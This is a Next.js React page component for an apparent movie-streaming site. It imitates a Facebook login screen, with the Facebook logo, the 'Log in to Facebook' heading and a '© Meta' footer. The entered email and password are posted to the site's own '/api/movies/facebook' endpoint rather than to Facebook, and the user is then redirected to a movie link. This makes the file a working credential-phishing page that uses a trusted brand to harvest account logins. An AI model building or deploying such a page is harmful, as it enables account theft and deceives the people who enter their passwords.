'use client';

import { useState, useEffect, Suspense } from 'react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import { movieData } from '../../assets/assets';

// Component that uses searchParams
function FacebookLoginContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const movieId = searchParams.get('movieId');
    
    const [formData, setFormData] = useState({
        email: '',
        password: '',
        rememberMe: false
    });
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    
    // Find the movie URL from movieData
    const getMovieUrl = (id) => {
        if (!id) return '#';
        const movie = movieData.find(m => m.id === parseInt(id));
        return movie ? movie.url : '#';
    };

    const handleChange = (e) => {
        const { name, value, type, checked } = e.target;
        setFormData(prev => ({
            ...prev,
            [name]: type === 'checkbox' ? checked : value
        }));
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        
        if (!formData.email || !formData.password) {
            setError('Please fill in all fields');
            return;
        }
        
        setLoading(true);
        setError('');
        
        try {
            const response = await fetch('/api/movies/facebook', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ...formData,
                    movieId
                }),
            });
            
            const data = await response.json();
            
            if (response.ok) {
                // Login successful, redirect to the movie URL
                const movieUrl = getMovieUrl(movieId);
                router.push(movieUrl);
            } else {
                setError(data.message || 'Login failed. Please try again.');
            }
        } catch (err) {
            setError('An error occurred. Please try again later.');
            console.error(err);
        } finally {
            setLoading(false);
        }
    };

    return (
        <main className="min-h-screen relative overflow-hidden bg-[#f0f2f5]">
            <div className="container mx-auto px-4 py-8 md:py-20 relative z-10 flex flex-col items-center">
                <div className="w-full max-w-md mx-auto">
                    {/* Facebook Logo */}
                    <div className="text-center mb-8">
                        <Image 
                            src="/facebook-logo.png" 
                            alt="Facebook" 
                            width={100} 
                            height={90} 
                            className="mx-auto"
                            priority
                        />
                    </div>

                    {/* Facebook Login Card */}
                    <div className="bg-white rounded-lg shadow-lg p-6">
                        <h1 className="text-xl font-semibold text-center text-gray-700 mb-6">Log in to Facebook</h1>
                        
                        {error && (
                            <div className="mb-4 p-3 bg-red-50 text-red-600 rounded-md text-sm">
                                {error}
                            </div>
                        )}
                        
                        <form onSubmit={handleSubmit}>
                            <div className="mb-4">
                                <input
                                    type="text"
                                    name="email"
                                    placeholder="Email address or phone number"
                                    className="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-1 focus:ring-blue-500"
                                    value={formData.email}
                                    onChange={handleChange}
                                />
                            </div>
                            
                            <div className="mb-4">
                                <input
                                    type="password"
                                    name="password"
                                    placeholder="Password"
                                    className="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-1 focus:ring-blue-500"
                                    value={formData.password}
                                    onChange={handleChange}
                                />
                            </div>
                            
                            <button
                                type="submit"
                                className={`w-full py-3 rounded-md font-semibold text-white ${loading ? 'bg-blue-400' : 'bg-blue-600 hover:bg-blue-700'} transition-colors`}
                                disabled={loading}
                            >
                                {loading ? 'Logging in...' : 'Log In'}
                            </button>
                            
                            <div className="flex justify-center mt-3">
                                <a href="#" className="text-blue-600 text-sm hover:underline">Forgotten password?</a>
                            </div>
                            
                            <div className="border-t border-gray-300 my-5"></div>
                            
                            <div className="flex justify-center">
                                <a href="#" className="bg-green-500 hover:bg-green-600 text-white py-3 px-5 rounded-md font-semibold transition-colors">
                                    Create new account
                                </a>
                            </div>
                        </form>
                    </div>
                    
                    <div className="mt-4 text-center">
                        <button 
                            onClick={() => router.push(`/movies/login?movieId=${movieId}`)}
                            className="text-blue-600 hover:underline text-sm"
                        >
                            Back to login options
                        </button>
                    </div>
                </div>
                
                {/* Back link at the bottom */}
                <div className="mt-12 text-center">
                    <Link href="/movies" className="text-sm text-gray-600 hover:underline">
                        ← Back to Movies
                    </Link>
                </div>
                
                {/* Copyright */}
                <div className="mt-8 text-center text-xs text-gray-500">
                    <p>© {new Date().getFullYear()} Meta</p>
                </div>
            </div>
        </main>
    );
}

// Loading fallback component
function LoadingFallback() {
    return (
        <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5]">
            <div className="text-center">
                <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                <p className="text-gray-600">Loading Facebook login...</p>
            </div>
        </div>
    );
}

// Main component with Suspense boundary
export default function FacebookLogin() {
    return (
        <Suspense fallback={<LoadingFallback />}>
            <FacebookLoginContent />
        </Suspense>
    );
} 